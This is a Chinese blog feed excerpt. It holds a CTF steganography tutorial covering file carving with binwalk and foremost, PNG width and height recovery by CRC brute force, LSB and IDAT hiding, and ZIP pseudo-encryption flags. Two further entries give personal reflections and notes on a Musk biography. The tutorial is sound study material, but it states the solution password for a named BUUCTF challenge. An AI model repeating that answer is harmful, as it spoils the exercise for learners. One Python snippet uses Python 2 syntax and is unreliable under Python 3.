    <title>MISC杂项之隐写分析</title>
    <link href="http://example.com/2023/10/31/MISC%E6%9D%82%E9%A1%B9%E4%B9%8B%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/10/31/MISC%E6%9D%82%E9%A1%B9%E4%B9%8B%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90/</id>
    <published>2023-10-30T16:00:00.000Z</published>
    <updated>2023-11-03T09:53:20.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为找不到工作，就学些自己感兴趣的东西了…惨</p><span id="more"></span><h1 id="隐写分析"><a href="#隐写分析" class="headerlink" title="隐写分析"></a>隐写分析</h1><p>简单来说，就是获取隐藏的信息。<br>隐写分析是 Misc 中最为重要的项目之一，包括文件分析、信息隐写等等，涉及巧妙的编码、隐藏数据、层层嵌套的文件中的文件等等于杂项一样，它也喜欢考察一些并非为我们所掌握的小知识，比如一些从来没听说过的乱七八糟的密码（比如与佛论禅加密、颜文字加密等等），我们需要善用自己的信息搜集能力。</p><h1 id="直接附加"><a href="#直接附加" class="headerlink" title="直接附加"></a>直接附加</h1><h2 id="识别文件类型"><a href="#识别文件类型" class="headerlink" title="识别文件类型"></a>识别文件类型</h2><p>1、 Linux命令: file<br>用法: <code>file filename</code><br>用于识别文件类型，若文件头残缺或文件头错误，则显示data，表示无法识别。<br>2、 16进制编辑器工具：<strong>010 Editer</strong> 或者 <strong>WinHex</strong><br>可查看文件头类型，根据文件头判断文件类型</p><p>文件的扩展名往往反映了文件的类型，但又不一定准确，因为我们可以随意地去修改它。<br>比如我们把可以一个 jpg 图片文件改名成 xxx.png，无论我们学过学过计算机知识都应该知道 JPG 和 PNG 不是同一个东西，但是我们双击却依然可以用图片查看器查看这张图片，这说明程序有自己的方式去判断这是什么类型的文件，从而选择读取这张图片内容的方式，这就是文件头的作用。<br>大部分文件类型有其固定的文件结构，基本结构为：<br><code>文件头 + 文件内容 + 文件尾(部分无)</code><br>图片查看器打开图片文件时，首先会根据文件头判断它是哪种类型的文件，然后再根据文件类型选择恰当的读取方式。<br>一般来说，程序在读取有文件尾的文件时一般只会读到文件尾，并不会关注后面还有没有别的内容。</p><p>所以对于有文件尾的文件类型A来说，文件尾之后的内容往往不会对文件的查看有影响，增加的内容普通情况下不会被发现（拿十六进制编辑器不算普通情况）。我们可以往它的文件尾后面添加字符，数字，甚至是藏一个别的文件，这就是直接附加。</p><h2 id="分离文件"><a href="#分离文件" class="headerlink" title="分离文件"></a>分离文件</h2><p>要分离出附加在文件A后面的文件，可以通过在十六进制编辑器中观察文件尾后中隐含的文件头信息来判断文件A中附加的文件类型，从而进行提取，常见文件类型文件头（尾）如下：</p><table><thead><tr><th>文件类型</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG(jpg)</td><td>FF D8 FF</td><td>FF D9</td></tr><tr><td>PNG</td><td>89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>GIF</td><td>47 49 46 38</td><td>00 3B</td></tr><tr><td>ZIP</td><td>50 4B 03 04</td><td>50 4B</td></tr><tr><td>RAR</td><td>52 61 72 21</td><td>&#x2F;</td></tr><tr><td>Wave(wav)</td><td>57 41 56 45</td><td>&#x2F;</td></tr></tbody></table><p>使用工具：<br><strong>Binwalk</strong>(Kali自带)<br><strong>Foremost</strong>(Linux下安装: <code>apt-get install foremost</code> )<br><strong>dd</strong> 当无法自动分离时，用dd实现文件手动分离<br>分离文件A中附加的其他文件，Binwalk 可以自动分析一个文件中包含的多个文件并将它们提取出来<br>Foremost 也可以分离文件而且有时候更好用一点<br>可以先用 Binwalk 进行分析，如果有隐藏文件再用 Foremost 分离</p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">binwalk [文件A]   # 分析文件A</span><br><span class="line">binwalk -e [文件A]    # 分析文件A后自动提取已知的文件类型的隐藏文件</span><br><span class="line">foremost [文件A]      # 分离文件A的隐藏文件，</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">存到与文件A同目录的output文件夹中，同时在文件夹中生成一个日志文件</span></span><br></pre></td></tr></table></figure><p>例题：BUUCTF - 二维码<br>注意分离出png文件和zip文件后，zip文件有密码，需要使用ARCHPR软件破解密码，直接使用数字暴力破解即可。密码是7639</p><h2 id="文件合并操作"><a href="#文件合并操作" class="headerlink" title="文件合并操作"></a>文件合并操作</h2><p>Linux下cat命令：<br><code>cat file1 file2 &gt; file3</code><br>可利用md5校验是否正确合并</p><h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学,英文写作Steganography。</p><h2 id="png文件结构"><a href="#png文件结构" class="headerlink" title="png文件结构"></a>png文件结构</h2><p><code>文件头（89 50 4E 47 0D 0A 1A 0A） + 数据块 + 数据块 + 数据块…… + 文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82）</code><br>PNG 定义了两种类型的数据块，一种是称为关键数据块，这是标准的数据块，另一种叫做辅助数据块，这是可选的数据块。关键数据块定义了4个标准数据块，每个 PNG 文件都必须包含它们。</p><p>IHDR（文件头数据块）<br>第一块是文件头数据块（IHDR），它由第11——32字节组成（从0开始），包含有 PNG 文件中存储的图像数据的基本信息，数据从第 16字节开始，有13个字节，其前8字节分别用4个字节规定了图片的宽和高（十六进制，以像素为单位）。</p><p>IDAT（图像数据块）<br>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。它采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩。</p><h2 id="IHDR-篡改图片宽高"><a href="#IHDR-篡改图片宽高" class="headerlink" title="IHDR 篡改图片宽高"></a>IHDR 篡改图片宽高</h2><p>IHDR 的前8字节规定了图片的宽和高，我们可以用十六进位文件编辑器更改它们以使得这张图片显示不完整，从而达到隐藏信息的目的。此时它的图片数据并没有变，在Windows图片查看器中超过规定的图片宽高的部分只是不显示了。<br>当修改了IHDR时，会提示 IHDR CRC error<br>这是因为在每个数据块的最后4字节都有CRC（循环冗余检测）用来检测是否有错误和被篡改<br>可以利用 python 脚本反推图片原宽高，然后用十六进制编辑器打开图片修改图片宽高得到原图片。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用 python [脚本文件名] [图片文件名]</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n): </span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>PNG 文件中的图像像数一般是由 RGB 三原色（红绿蓝）组成（有的图片还包含A通道表示透明度），每一种颜色占用8位，取值范围为0x00至0xFF。LSB 隐写就是修改 RGB 颜色分量的最低二进制位（LSB），它修改了每个像数颜色的最低的1 bit，而人类的眼睛不会注意到这前后的变化，这样每个像素可以携带3比特的信息。</p><p>如果是要寻找这种 LSB 隐藏痕迹的话，有一个工具 Stegsolve 是个神器，可以来辅助我们进行分析。通过下方的按钮观察每个通道的信息，我们可以捕捉异常点，抓住 LSB 隐写的蛛丝马迹（这玩意儿很难说，一般就是一看就感觉奇怪的n行或n列颜色块），进而利用 Stegsolve –&gt; Analyse –&gt; Data Extract 功能指定通道进行提取。</p><p>对于PNG和BMP文件中的 LSB 等常见的隐写方式，我们也可以使用 zsteg 工具直接进行自动化的识别和提取。</p><h2 id="IDAT隐写"><a href="#IDAT隐写" class="headerlink" title="IDAT隐写"></a>IDAT隐写</h2><p>IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块。程序读取图像的时候也会在 第一个未满的块停止 （查了下W3C标准，其实是PNG图片在压缩的时候会在最后一个块的标记位标明这是最后一个数据块）。所以如果某一块没有满但后面却还有 IDAT 块则说明后面的块是“假”的。</p><p>我们可以用 pngcheck -v [文件名] 去查看PNG文件数据块信息，然后利用 python zlib 解压多余IDAT块的内容，此时注意剔除长度、数据块类型及末尾的CRC校验值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">IDAT = <span class="string">&quot; &quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)    <span class="comment">#双引号中填IDAT数据</span></span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/62895080">隐写术之图片隐写</a></p><h1 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h1><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包<br>一个 ZIP 文件由三个部分组成：<br>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p><p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zhuanlan.zhihu.com/p/599530557">从0开始学杂项</a><br><a href="https://cloud.tencent.com/developer/article/2069964">常见隐写工具</a><br><a href="https://codeantenna.com/a/H0NwncBJZh">F5隐写</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为找不到工作，就学些自己感兴趣的东西了…惨&lt;/p&gt;</summary>
    
    
    
    <category term="MISC杂项" scheme="http://example.com/categories/MISC%E6%9D%82%E9%A1%B9/"/>
    
    <category term="隐写" scheme="http://example.com/categories/MISC%E6%9D%82%E9%A1%B9/%E9%9A%90%E5%86%99/"/>
    
    
    <category term="MISC杂项" scheme="http://example.com/tags/MISC%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>埃隆马斯克传--与风共舞的孩子</title>
    <link href="http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E4%B8%8E%E9%A3%8E%E5%85%B1%E8%88%9E%E7%9A%84%E5%AD%A9%E5%AD%90/"/>
    <id>http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E4%B8%8E%E9%A3%8E%E5%85%B1%E8%88%9E%E7%9A%84%E5%AD%A9%E5%AD%90/</id>
    <published>2023-10-12T16:00:00.000Z</published>
    <updated>2023-11-07T15:52:53.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每天读一点，读完了这本最新的厚厚的艾萨克森所写的《埃隆马斯克传》。</p><span id="more"></span><h1 id="聊聊背景"><a href="#聊聊背景" class="headerlink" title="聊聊背景"></a>聊聊背景</h1><p>第一次知道马斯克是在2017年左右，我觉得他不错，但我没有过多关注。到了2020年后关注渐渐多起来，了解了他的公司与所作所为，也开始在推特上关注他。没办法，他天生就是一个引人注目的人。<br>真正的事无巨细了解他，是在2023年4月。也不知是什么契机，我就开始深入了解了，去看他的演讲，他的采访，真正了解他所想而不仅仅是所为。在那个时候我也得知了他有一本传记《硅谷钢铁侠》，但这本传记是在2015年出版，实在距离久远了。并且看了下作者的一些行为，我不认为他是一个写得好马斯克传记的人。<br>但到了2023.9.12，突然得知马斯克的新传记出了。有点诧异，又看了下作家和写作历程，我开始认为这本书是值得一读的。苦于没找到渠道，于是搁置了几天，偶然过了几天发现了一个频道是专门做最新出的电子书。我好奇翻了下，发现真有最新的马斯克传。于是我的阅读之旅便开始了。<br>这本传记读下来很轻松也有趣。大部分时间是在就餐时或快休息时阅读的。看的不算快，估计有15小时左右。</p><h1 id="暴君"><a href="#暴君" class="headerlink" title="暴君"></a>暴君</h1><p>之前看有人说Elon是“硅谷暴君”，我以为只是一种戏称。当真正读完了这部传记，才明白是名副其实。<br>比如，他凌晨2点叫一个员工研究某项目，并要求3小时后提出方案。会对没达到要求的员工破口大骂。会设置一个疯狂的deadline。当他对某人的工作不满意时会解雇他，即使这个人已经跟了他20年。<br>当然，这个暴君和传统意义上的暴君并不完全相同。这个暴君会深入研究技术，他同时是特斯拉和SpaceX的首席工程师。会去基层获得一手信息，提拔有才能的人。<br>特斯拉与spaceX等公司的快速成功与Elon的暴君性格是离不开的。我们在说到暴君时，常常会想到封建王朝统治的君王，独裁者。无疑，Elon是不折不扣的独裁者。那我们就必须思考一个问题：是什么原因导致传统的暴君失败，而Elon这样的暴君却会成功呢？</p><p>所谓暴君，是对待自己的人严厉，喜怒无常的人。我认为有如下原因：</p><ol><li>价值感。Elon的公司都是在做有价值的事，Elon本身也会给员工灌输远大的使命感，这让员工们产生了一种创造价值的自豪感满足感。很多公司的创新犹如塞在牙缝间的食物残渣不值一提，这些公司的员工上班只是为了拿钱混日子。自然是有天壤之别。</li><li>以身作则。人喜欢比较，而Elon看到了这一点，因此他常常住在公司，过着比员工还要辛苦的生活。同时他是几家公司的首席工程师，对技术细节十分了解，而不是外行人的指手画脚。由此员工内心的不平衡感也少了很多，使他们更专注于技术。</li></ol><p>之前看到一则新闻说特斯拉和SpaceX每年收到的简历是360万份，可想而知，人们宁愿待在暴君的公司里，也要创造价值。反衬出当今世界的发展创新有多么不堪！</p><h1 id="格局"><a href="#格局" class="headerlink" title="格局"></a>格局</h1><p>当其他企业家还在努力形成世界观时，他已经形成了宇宙观。</p><p>人们常常喜欢说格局，实际上真正有格局的人又有几个呢？<br>有一些风险就畏缩不前，造成了一点损失就心疼不已，张口闭嘴不过是俗物。格局不是嘴上的说辞，是内心所想。<br>如果一个人在他30岁之前的目标或是梦想，只是有房有车，年薪几十万，婚姻家庭美满。这样的生活当然也幸福，甚至说这就是大多数人所追求的。但我不屑于这样的生活，我希望我的人生更加激烈一些，不是平稳落地，至少要碰撞出火花。<br>一个人看见什么，那么他就能达到与之相同或更低的生活。</p><p>当然，只有格局也不够，还要有与格局相配的器量。而这又是另一件事了。</p><h1 id="工作与生活"><a href="#工作与生活" class="headerlink" title="工作与生活"></a>工作与生活</h1><p>Elon瞧不起“要在工作和生活中找到一种平衡状态”的价值观。<br>黄家驹说：“生命不在于得到什么，而在于做过什么。”<br>我想，伟人的价值观念或许都有很多共通之处。</p><p>工作，意味着是在做创造价值的事。生活则是其它一切享乐，陪伴家人朋友等等的事。<br>工作与生活的平衡大概就是每周工作5天，每天工作8小时这种情况。<br>要解决到底应该如何处置工作与生活的问题，我们要回到一个根本性的问题：我们为什么而活？<br>是为了他人，还是为了自己？是为了得到什么，还是为了做过什么？是为了享受人生，还是为了改变世界？<br>如果答案均为前者，那么工作与生活平衡就是正确选择。如果答案均为后者，那别管什么平衡了，全力以赴对待工作吧！<br>我本人也是倾向于后者的，因为享乐的生活并不有趣。</p><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h1><p>“看看他后来创办的两家公司——SpaceX和特斯拉。”蒂尔说，“按照硅谷的投资和经营哲学，这两家公司的业务都是极其疯狂的赌注。但如果这样两家没人看好的公司都成功了，那么你就得跟自己说：‘我认为埃隆对风险的理解超越了所有人。’”</p><p>一个人能做得很快，但是力量不足。一家公司力量足够，但如果不统一，效率就低下。公司如果高度统一，就是控制人化身的巨人。<br>我认为Elon对于风险的理解是根据物理学和现实合理推导，只要合理的都是行得通的，那么剩下的是人的努力程度。<br>就比如火箭的发射，因为美中苏都能把人送上天，甚至早在几十年前就把人送上月球。符合物理学，也符合现实发展速度。那么这件事就是理论上达得到的。<br>就比如电动车的制造，因为电动车早有发展，电池技术也有突破。符合物理学，也符合现实发展速度。那么这件事就是理论上达得到的。<br>那么为何按照硅谷的投资和经营哲学这两家公司的业务都是疯狂的赌注呢？我认为有2个原因，其一，这件事之前没人成功过；其二，用人方式是以人为本，没有最大限度激发人的潜力。<br>那么Elon既做到了符合现实，也做到了将人统一。那么成功也就不是不可能的事了。</p><h1 id="deadline"><a href="#deadline" class="headerlink" title="deadline"></a>deadline</h1><p>就我对自己和他人的观察来看，在没有压力下，人很容易陷入一种安然自得的心态中。也即自我满足。<br>生于忧患死于安乐，设置deadline本质上是人为地添加一个“忧患”，来防止自己的安乐感。<br>人舒适得生活太久，就会不知道自己的潜力在哪里。在做事的时候，调动的精力不同，那么即便花同样的时间做同一件事效果也会不同。所以重要的不是如何度过一段时间，而是如何最大限度地利用这段时间。<br>设置一个极限的deadline，去把自己逼到极致，这不是很有趣吗？</p><h1 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h1><p>马斯克在推特上回应说：“你并不是在一丝不苟地追求真理，而是在向外界彰显你的‘美德’，以显示你在媒体精英面前是一个‘好人’，你就是想脚踩两只船。”</p><p>事实上，很多人都是采取这种态度。正如在生活中常见的两边吵架不知道该支持哪一边于是决定做裁判。<br>总的来说我认为不知道支持哪一边的原因有几个：<br>1、怕得罪人。因为选择其中一边通常就容易得罪另一边，不想要和一方搞坏关系。<br>2、置身事外。觉得自己理性，能够看到双方的不足之处，也即认为自己是在双方之上的“裁判”。</p><p>这不过是逃避罢了，战胜恐惧才是真正的选择。</p><h1 id="政客"><a href="#政客" class="headerlink" title="政客"></a>政客</h1><p>马斯克对唐纳德·特朗普的态度是深深的鄙夷，认为他就是个骗子，但马斯克同样不认同拜登：“他还是副总统的时候，我和他在旧金山吃过一顿午餐。他在那里滔滔不绝地讲了一个小时，无聊至极，他像个一上弦就能一遍遍重复无聊短语的玩偶。”</p><p>“航空航天这种高端产业的从业者和政府官员都以嘲笑SpaceX和埃隆为乐。”加弗说，“埃隆比他们年轻，比他们富有，拥有硅谷那种创新颠覆者的心态，面对传统行业的桎梏，初生牛犊不怕虎，然而这些都不足以让那些人对他高看一眼。”</p><p>我并不了解政客是什么样的，毕竟我不是。但如果这就是政客，美国的总统就由这些人担任，那也太愚蠢了。</p><h1 id="精英与民主"><a href="#精英与民主" class="headerlink" title="精英与民主"></a>精英与民主</h1><p>马斯克已然踏上了这样一条道路：他要展开一场角斗，一方是他心中那些过犹不及的政治正确思潮，另一方是那些代表着进步思想与社会正义的活动家的觉醒文化思潮。我问他为什么要这么做，他回答说：“那些号称能让人觉醒的心智病毒，比如反科学、反精英、反人类思潮，如果不从根本上铲除它们，人类文明永远都不会成为星际文明。”</p><p>哎，世上永远都是蠢蛋多。</p><h1 id="五步工作法及其推论"><a href="#五步工作法及其推论" class="headerlink" title="五步工作法及其推论"></a>五步工作法及其推论</h1><p>工作法包含了五大步骤：1.质疑每项要求。提出任何一项要求时，都应该附上提出这一要求的人。永远不要接受一项来自某个部门的要求，比如来自“法务部门”或者“安全部门”的要求。你必须知道提出这项要求的人的名字。接下来你应该质疑它，不管这个人有多聪明。聪明人提出的要求才是最危险的，因为人们不太可能质疑他们。这件事要一直做下去，即便这项要求来自我马斯克本人。质疑后，大家就要改进要求，让它变得不那么愚蠢。<br>2.删除要求当中所有你能删除的部分和流程，虽然你可能还得把它们加回来。事实上，你如果最后加回来的部分还不到删除部分的10%，那就说明你删减得还不够。<br>3.简化和优化。这应该放在第2步之后，因为人们常犯的错误就是简化和优化一个原本不应该存在的部分或者流程。<br>4.加快周转时间。每个流程都可以加快，但只有遵循了前三个步骤之后才能这么做。在特斯拉工厂，我错误地把很多精力花在加快生产流程上，后来我才意识到有些流程原本就应该被拿掉。<br>5.自动化。在内华达工厂和弗里蒙特工厂犯下的一个大错就是我一开始试图将每个步骤进行自动化改造。我们本应该先质疑所有要求，删除不必要的部分和流程，把问题筛出来、处理掉，然后再推进自动化。</p><p>这套工作法有时还衍生出一些推论，包括：<br>• 所有技术经理都必须有实战经验，比如说软件团队的管理人员必须至少花20%的时间进行编程，太阳能屋顶业务的经理必须花时间在屋顶上亲自做安装工作。否则光说不练，他们就像是不会骑马的骑兵队队长、不会舞刀弄枪的将军。<br>• “你好，我好，大家好”是很危险的，人们会因此不再质疑同事的工作成果。人们天然有一种倾向是不想把要好的同事踢下船，而这种危险倾向一定要避免。<br>• 犯错没关系，但错了还不肯低头就不行。<br>• 永远不要要求你的团队做你自己都不愿意做的事。<br>• 每当有问题需要解决时，不要只与你直接管理的相关负责人聊。深入调研就要跨层级沟通，去跟你属下的属下直接交流吧。<br>• 招聘要招态度端正的人。技能是可以教的，但要扭转一个人的工作态度可就太费劲了，得给他“换个脑子”。<br>• 疯狂的紧迫感是我们公司运作的法则。<br>• 唯一要遵守的规则就是物理学定律能推导出来的规则，其他一切都只是建议。</p><h1 id="总体感受"><a href="#总体感受" class="headerlink" title="总体感受"></a>总体感受</h1><p>这本书读了会带给人怎样的收获呢？我认为有以下几点：</p><ol><li>对于不打算效仿的人来说，了解了世上原来还有这种人，为整个人类思考，每天疯狂工作，不遵守社会规则。</li><li>对于世界观还未形成或未完善的人来说，会带来剧烈的冲击。</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>可惜的是没能在看完的第一时间写完感想，这导致我遗忘了不少，看的时候感想多，写的时候却不怎么样。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;每天读一点，读完了这本最新的厚厚的艾萨克森所写的《埃隆马斯克传》。&lt;/p&gt;</summary>
    
    
    
    <category term="读后感" scheme="http://example.com/categories/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
    <category term="埃隆马斯克传" scheme="http://example.com/categories/%E8%AF%BB%E5%90%8E%E6%84%9F/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0/"/>
    
    
    <category term="读后感" scheme="http://example.com/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
    <category term="马斯克" scheme="http://example.com/tags/%E9%A9%AC%E6%96%AF%E5%85%8B/"/>
    
  </entry>
  
  <entry>
    <title>埃隆马斯克传--读书笔记</title>
    <link href="http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2023-10-12T16:00:00.000Z</published>
    <updated>2023-10-13T07:26:07.113Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚读完了艾萨克森写的马斯克传记，作为一本读了20天的书，我也有许多想做笔记的地方。</p><span id="more"></span><h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><font color=red>当其他企业家还在努力形成世界观时，他已经形成了宇宙观。</font></p><p><font color=blue>格局很重要，看到什么，就会影响自己做什么。</font></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><font color=red>十几岁的时候，埃隆开始觉得缺了点儿什么。他说宗教和科学对于存在的解释都没有解决真正的大问题，比如宇宙从何而来，它为什么会存在？物理学可以讲明白关于宇宙的一切，除了这个“为什么”。这导致了他所谓的“青春期存在主义危机”。“我想要弄清楚生命和宇宙的意义是什么，”埃隆说，“但我为此感到非常沮丧，好像生命可能就没有什么意义。”</font><br><font color=blue>或许每个会独立思考的人都会有这种思考。我只是在思考生命没什么意义后就随波逐流。</font></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><font color=red>“你和埃罗尔在一起会有一种感觉，可能会发生非常糟糕的事情。如果丧尸末日那样的场景出现了，你会想加入埃隆的团队，因为他会想出办法让那些丧尸老实待着，排好队。他可能非常严厉，但在末日来临之际，你可以信赖他，他总能找到胜利的曙光。”</font><br><font color=blue>世界末日之时，Elon这样的人才能带领我们活下去。</font></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><font color=red>从职业生涯的一开始，马斯克就是一个苛刻的管理者，瞧不起“要在工作和生活中找到一种平衡状态”的价值观。</font><br><font color=blue>我对工作和生活的关系，一直处于摇摆不定的态度，有时觉得工作多于生活好，有时觉得工作与生活平衡比较好。就我个人的所作所为而言，我还是倾向于后者的。在大多数没有全力关心一件事时，都是想着工作一会儿就娱乐一会儿。<br>现在我应该是彻底改变了想法：工作要远大于生活。这个世界上没有人比他更耀眼了，也没其他人或思想能够再动摇我的看法了。</font></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><font color=red>他觉得自己这辈子要么富可敌国，要么倾家荡产，没有第三种可能。</font><br><font color=blue>这是他二十岁左右说的话，现在看来是前者：富可敌国。</font></p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><font color=red>“看看他后来创办的两家公司——SpaceX和特斯拉。”蒂尔说，“按照硅谷的投资和经营哲学，这两家公司的业务都是极其疯狂的赌注。但如果这样两家没人看好的公司都成功了，那么你就得跟自己说：‘我认为埃隆对风险的理解超越了所有人。’”</font><br><font color=blue>我炒币过一段时间，自认为对风险有一定了解。不过在Elon面前都不过是班门弄斧。<br>如果想要在这个世界过得舒适，那么像金融那样做风险控制或许是正确的。但如果想给这个世界带来些改变些什么，那么我认为要像Elon这样行事才是正确的方式。</font></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><font 